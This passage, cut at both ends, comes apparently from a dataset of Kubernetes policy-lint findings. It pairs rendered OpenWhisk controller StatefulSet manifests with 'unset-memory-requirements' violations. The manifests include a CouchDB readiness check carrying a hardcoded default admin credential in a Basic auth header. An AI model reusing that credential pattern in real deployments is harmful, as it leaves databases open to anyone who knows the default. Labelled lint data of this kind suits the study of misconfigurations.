0m\n        - name: CONFIG_whisk_logLimit_max\n          value: 10m\n        - name: CONFIG_whisk_logLimit_std\n          value: 10m\n        - name: CONFIG_whisk_activation_payload_max\n          value: '1048576'\n        - name: CONFIG_whisk_loadbalancer_blackboxFraction\n          value: 10%\n        - name: CONFIG_whisk_loadbalancer_timeoutFactor\n          value: '2'\n        - name: KAFKA_HOSTS\n          value: RELEASE-NAME-kafka-0.RELEASE-NAME-kafka.default.svc.cluster.local:9092\n        - name: CONFIG_whisk_kafka_replicationFactor\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_couchdb_username\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_username\n        - name: CONFIG_whisk_couchdb_password\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_password\n        - name: CONFIG_whisk_couchdb_port\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_port\n        - name: CONFIG_whisk_couchdb_protocol\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_protocol\n        - name: CONFIG_whisk_couchdb_host\n          value: RELEASE-NAME-couchdb.default.svc.cluster.local\n        - name: CONFIG_whisk_couchdb_provider\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_provider\n        - name: CONFIG_whisk_couchdb_databases_WhiskActivation\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_activations\n        - name: CONFIG_whisk_couchdb_databases_WhiskEntity\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_actions\n        - name: CONFIG_whisk_couchdb_databases_WhiskAuth\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_auths\n        - name: CONTROLLER_INSTANCES\n          value: '1'\n        - name: CONFIG_logback_log_level\n          value: INFO\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"controller\" has memory limit 0"
  },
  {
    "id": "10556",
    "manifest_path": "data/manifests/the_stack_sample/sample_4076.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: RELEASE-NAME-controller\n  labels:\n    name: RELEASE-NAME-controller\n    heritage: Helm\n    release: RELEASE-NAME\n    chart: openwhisk-1.0.1\n    app: RELEASE-NAME-openwhisk\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: RELEASE-NAME-controller\n  template:\n    metadata:\n      labels:\n        name: RELEASE-NAME-controller\n        heritage: Helm\n        release: RELEASE-NAME\n        chart: openwhisk-1.0.1\n        app: RELEASE-NAME-openwhisk\n    spec:\n      serviceAccountName: RELEASE-NAME-core\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: NotIn\n                values:\n                - invoker\n          - weight: 80\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: In\n                values:\n                - core\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: name\n                operator: In\n                values:\n                - RELEASE-NAME-controller\n            topologyKey: kubernetes.io/hostname\n      initContainers:\n      - name: wait-for-kafka\n        image: openwhisk/ow-utils:3e6138d\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - 'cacert=\"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\"; token=\"$(cat\n          /var/run/secrets/kubernetes.io/serviceaccount/token)\"; while true; do rc=$(curl\n          -sS --cacert $cacert --header \"Authorization: Bearer $token\" https://kubernetes.default.svc/api/v1/namespaces/default/endpoints/RELEASE-NAME-kafka\n          | jq -r \".subsets[].addresses | length\"); echo \"num ready kafka endpoints\n          is $rc\"; if [ $rc -gt 0 ]; then echo \"Success: ready kafka endpoint!\"; break;\n          fi; echo \"kafka not ready yet; sleeping for 3 seconds\"; sleep 3; done;'\n      - name: wait-for-couchdb\n        image: busybox:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: READINESS_URL\n          value: http://RELEASE-NAME-couchdb.default.svc.cluster.local:5984/ow_kube_couchdb_initialized_marker\n        command:\n        - sh\n        - -c\n        - 'while true; do echo ''checking CouchDB readiness''; wget -T 5 --spider\n          $READINESS_URL --header=\"Authorization: Basic d2hpc2tfYWRtaW46c29tZV9wYXNzdzByZA==\";\n          result=$?; if [ $result -eq 0 ]; then echo ''Success: CouchDB is ready!'';\n          break; fi; echo ''...not ready yet; sleeping 3 seconds before retry''; sleep\n          3; done;'\n      containers:\n      - name: controller\n        imagePullPolicy: IfNotPresent\n        image: openwhisk/controller:3e6138d\n        command:\n        - /bin/bash\n        - -c\n        - /init.sh `hostname | awk -F '-' '{print $NF}'`\n        ports:\n        - name: controller\n          containerPort: 8080\n        - name: akka-remoting\n          containerPort: 2552\n        - name: akka-mgmt-http\n          containerPort: 19999\n        livenessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: PORT\n          value: '8080'\n        - name: TZ\n          value: UTC\n        - name: CONFIG_whisk_info_date\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_date\n        - name: CONFIG_whisk_info_buildNo\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_buildNo\n        - name: JAVA_OPTS\n          value: '-Xmx1024M '\n        - name: CONTROLLER_OPTS\n          value: ' '\n        - name: RUNTIMES_MANIFEST\n          value: \"{\\n    \\\"runtimes\\\": {\\n        \\\"nodejs\\\": [\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"nodejs:12\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-nodejs-v12\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"nodejs:14\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-nodejs-v14\\\",\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n  \\\n            \\              },\\n                \\\"deprecated\\\": false,\\n          \\\n            \\      \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      },\\n                \\\"stemCells\\\": [\\n                    {\\n \\\n            \\                       \\\"initialCount\\\": 2,\\n                       \\\n            \\ \\\"memory\\\": \\\"256 MB\\\",\\n                        \\\"reactive\\\": {\\n \\\n            \\                           \\\"minCount\\\": 1,\\n                       \\\n            \\     \\\"maxCount\\\": 4,\\n                            \\\"ttl\\\": \\\"2 minutes\\\"\\\n            ,\\n                            \\\"threshold\\\": 1,\\n                   \\\n            \\         \\\"increment\\\": 1\\n                        }\\n              \\\n            \\      }\\n                ]\\n            }\\n        ],\\n        \\\"python\\\"\\\n            : [\\n            {\\n                \\\"kind\\\": \\\"python:3\\\",\\n        \\\n            \\        \\\"default\\\": true,\\n                \\\"image\\\": {\\n          \\\n            \\          \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"\\\n            action-python-v3.7\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n     \\\n            \\           },\\n                \\\"deprecated\\\": false,\\n             \\\n            \\   \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      }\\n            }\\n        ],\\n        \\\"swift\\\": [\\n          \\\n            \\  {\\n                \\\"kind\\\": \\\"swift:4.2\\\",\\n                \\\"default\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-swift-v4.2\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"swift:5.1\\\",\\n \\\n            \\               \\\"default\\\": false,\\n                \\\"image\\\": {\\n  \\\n            \\                  \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-swift-v5.1\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.3\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.3\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.4\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.4\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"java\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"java:8\\\",\\n              \\\n            \\  \\\"default\\\": true,\\n                \\\"image\\\": {\\n                \\\n            \\    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"java8action\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"jarfile\\\",\\n              \\\n            \\      \\\"attachmentType\\\": \\\"application/java-archive\\\"\\n            \\\n            \\    },\\n                \\\"requireMain\\\": true\\n            }\\n      \\\n            \\  ],\\n        \\\"php\\\": [\\n            {\\n                \\\"kind\\\": \\\"\\\n            php:7.3\\\",\\n                \\\"default\\\": false,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-php-v7.3\\\",\\n\\\n            \\                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"php:7.4\\\",\\n                \\\"default\\\": true,\\n           \\\n            \\     \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n         \\\n            \\           \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\":\\\n            \\ \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n    \\\n            \\            },\\n                \\\"attached\\\": {\\n                   \\\n            \\ \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"php:8.0\\\",\\n                \\\"default\\\": false,\\n\\\n            \\                \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n\\\n            \\                },\\n                \\\"attached\\\": {\\n               \\\n            \\     \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            }\\n        ],\\n     \\\n            \\   \\\"ruby\\\": [\\n            {\\n                \\\"kind\\\": \\\"ruby:2.5\\\"\\\n            ,\\n                \\\"default\\\": true,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                },\\n                \\\"image\\\": {\\n                 \\\n            \\   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-ruby-v2.5\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                }\\n      \\\n            \\      }\\n        ],\\n        \\\"go\\\": [\\n            {\\n             \\\n            \\   \\\"kind\\\": \\\"go:1.15\\\",\\n                \\\"default\\\": true,\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                },\\n     \\\n            \\           \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\"\\\n            ,\\n                    \\\"name\\\": \\\"action-golang-v1.15\\\",\\n          \\\n            \\          \\\"tag\\\": \\\"1.18.0\\\"\\n                }\\n            }\\n   \\\n            \\     ],\\n        \\\"rust\\\": [\\n            {\\n                \\\"kind\\\"\\\n            : \\\"rust:1.34\\\",\\n                \\\"default\\\": true,\\n               \\\n            \\ \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n          \\\n            \\          \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                },\\n                \\\"image\\\": {\\n \\\n            \\                   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-rust-v1.34\\\",\\n                    \\\"tag\\\": \\\"1.3.0\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"dotnet\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"dotnet:2.2\\\",\\n          \\\n            \\      \\\"default\\\": true,\\n                \\\"deprecated\\\": false,\\n  \\\n            \\              \\\"requireMain\\\": true,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-dotnet-v2.2\\\",\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\\n            \\n                },\\n                \\\"attached\\\": {\\n              \\\n            \\      \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"dotnet:3.1\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"deprecated\\\": false,\\n                \\\"requireMain\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-dotnet-v3.1\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\n                },\\n     \\\n            \\           \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ],\\n        \\\"ballerina\\\":\\\n            \\ [\\n            {\\n                \\\"kind\\\": \\\"ballerina:0.990\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-ballerina-v0.990.2\\\",\\n                    \\\"tag\\\": \\\"nightly\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ]\\n    },\\n    \\\"blackboxes\\\"\\\n            : [\\n        {\\n            \\\"prefix\\\": \\\"openwhisk\\\",\\n            \\\"\\\n            name\\\": \\\"dockerskeleton\\\",\\n            \\\"tag\\\": \\\"1.14.0\\\"\\n       \\\n            \\ }\\n    ]\\n}\\n\"\n        - name: LIMITS_ACTIONS_INVOKES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_INVOKES_CONCURRENT\n          value: '30'\n        - name: LIMITS_TRIGGERS_FIRES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_SEQUENCE_MAXLENGTH\n          value: '50'\n        - name: CONFIG_whisk_timeLimit_min\n          value: 100ms\n        - name: CONFIG_whisk_timeLimit_max\n          value: 5m\n        - name: CONFIG_whisk_timeLimit_std\n          value: 1m\n        - name: CONFIG_whisk_memory_min\n          value: 128m\n        - name: CONFIG_whisk_memory_max\n          value: 512m\n        - name: CONFIG_whisk_memory_std\n          value: 256m\n        - name: CONFIG_whisk_concurrencyLimit_min\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_max\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_std\n          value: '1'\n        - name: CONFIG_whisk_logLimit_min\n          value: 0m\n        - name: CONFIG_whisk_logLimit_max\n          value: 10m\n        - name: CONFIG_whisk_logLimit_std\n          value: 10m\n        - name: CONFIG_whisk_activation_payload_max\n          value: '1048576'\n        - name: CONFIG_whisk_loadbalancer_blackboxFraction\n          value: 10%\n        - name: CONFIG_whisk_loadbalancer_timeoutFactor\n          value: '2'\n        - name: KAFKA_HOSTS\n          value: RELEASE-NAME-kafka-0.RELEASE-NAME-kafka.default.svc.cluster.local:9092\n        - name: CONFIG_whisk_kafka_replicationFactor\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_couchdb_username\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_username\n        - name: CONFIG_whisk_couchdb_password\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_password\n        - name: CONFIG_whisk_couchdb_port\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_port\n        - name: CONFIG_whisk_couchdb_protocol\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_protocol\n        - name: CONFIG_whisk_couchdb_host\n          value: RELEASE-NAME-couchdb.default.svc.cluster.local\n        - name: CONFIG_whisk_couchdb_provider\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_provider\n        - name: CONFIG_whisk_couchdb_databases_WhiskActivation\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_activations\n        - name: CONFIG_whisk_couchdb_databases_WhiskEntity\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_actions\n        - name: CONFIG_whisk_couchdb_databases_WhiskAuth\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_auths\n        - name: CONTROLLER_INSTANCES\n          value: '1'\n        - name: CONFIG_logback_log_level\n          value: INFO\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"wait-for-couchdb\" has memory limit 0"
  },
  {
    "id": "10557",
    "manifest_path": "data/manifests/the_stack_sample/sample_4076.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: RELEASE-NAME-controller\n  labels:\n    name: RELEASE-NAME-controller\n    heritage: Helm\n    release: RELEASE-NAME\n    chart: openwhisk-1.0.1\n    app: RELEASE-NAME-openwhisk\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: RELEASE-NAME-controller\n  template:\n    metadata:\n      labels:\n        name: RELEASE-NAME-controller\n        heritage: Helm\n        release: RELEASE-NAME\n        chart: openwhisk-1.0.1\n        app: RELEASE-NAME-openwhisk\n    spec:\n      serviceAccountName: RELEASE-NAME-core\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: NotIn\n                values:\n                - invoker\n          - weight: 80\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: In\n                values:\n                - core\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: name\n                operator: In\n                values:\n                - RELEASE-NAME-controller\n            topologyKey: kubernetes.io/hostname\n      initContainers:\n      - name: wait-for-kafka\n        image: openwhisk/ow-utils:3e6138d\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - 'cacert=\"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\"; token=\"$(cat\n          /var/run/secrets/kubernetes.io/serviceaccount/token)\"; while true; do rc=$(curl\n          -sS --cacert $cacert --header \"Authorization: Bearer $token\" https://kubernetes.default.svc/api/v1/namespaces/default/endpoints/RELEASE-NAME-kafka\n          | jq -r \".subsets[].addresses | length\"); echo \"num ready kafka endpoints\n          is $rc\"; if [ $rc -gt 0 ]; then echo \"Success: ready kafka endpoint!\"; break;\n          fi; echo \"kafka not ready yet; sleeping for 3 seconds\"; sleep 3; done;'\n      - name: wait-for-couchdb\n        image: busybox:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: READINESS_URL\n          value: http://RELEASE-NAME-couchdb.default.svc.cluster.local:5984/ow_kube_couchdb_initialized_marker\n        command:\n        - sh\n        - -c\n        - 'while true; do echo ''checking CouchDB readiness''; wget -T 5 --spider\n          $READINESS_URL --header=\"Authorization: Basic d2hpc2tfYWRtaW46c29tZV9wYXNzdzByZA==\";\n          result=$?; if [ $result -eq 0 ]; then echo ''Success: CouchDB is ready!'';\n          break; fi; echo ''...not ready yet; sleeping 3 seconds before retry''; sleep\n          3; done;'\n      containers:\n      - name: controller\n        imagePullPolicy: IfNotPresent\n        image: openwhisk/controller:3e6138d\n        command:\n        - /bin/bash\n        - -c\n        - /init.sh `hostname | awk -F '-' '{print $NF}'`\n        ports:\n        - name: controller\n          containerPort: 8080\n        - name: akka-remoting\n          containerPort: 2552\n        - name: akka-mgmt-http\n          containerPort: 19999\n        livenessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: PORT\n          value: '8080'\n        - name: TZ\n          value: UTC\n        - name: CONFIG_whisk_info_date\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_date\n        - name: CONFIG_whisk_info_buildNo\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_buildNo\n        - name: JAVA_OPTS\n          value: '-Xmx1024M '\n        - name: CONTROLLER_OPTS\n          value: ' '\n        - name: RUNTIMES_MANIFEST\n          value: \"{\\n    \\\"runtimes\\\": {\\n        \\\"nodejs\\\": [\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"nodejs:12\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-nodejs-v12\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"nodejs:14\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-nodejs-v14\\\",\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n  \\\n            \\              },\\n                \\\"deprecated\\\": false,\\n          \\\n            \\      \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      },\\n                \\\"stemCells\\\": [\\n                    {\\n \\\n            \\                       \\\"initialCount\\\": 2,\\n                       \\\n            \\ \\\"memory\\\": \\\"256 MB\\\",\\n                        \\\"reactive\\\": {\\n \\\n            \\                           \\\"minCount\\\": 1,\\n                       \\\n            \\     \\\"maxCount\\\": 4,\\n                            \\\"ttl\\\": \\\"2 minutes\\\"\\\n            ,\\n                            \\\"threshold\\\": 1,\\n                   \\\n            \\         \\\"increment\\\": 1\\n                        }\\n              \\\n            \\      }\\n                ]\\n            }\\n        ],\\n        \\\"python\\\"\\\n            : [\\n            {\\n                \\\"kind\\\": \\\"python:3\\\",\\n        \\\n            \\        \\\"default\\\": true,\\n                \\\"image\\\": {\\n          \\\n            \\          \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"\\\n            action-python-v3.7\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n     \\\n            \\           },\\n                \\\"deprecated\\\": false,\\n             \\\n            \\   \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      }\\n            }\\n        ],\\n        \\\"swift\\\": [\\n          \\\n            \\  {\\n                \\\"kind\\\": \\\"swift:4.2\\\",\\n                \\\"default\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-swift-v4.2\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            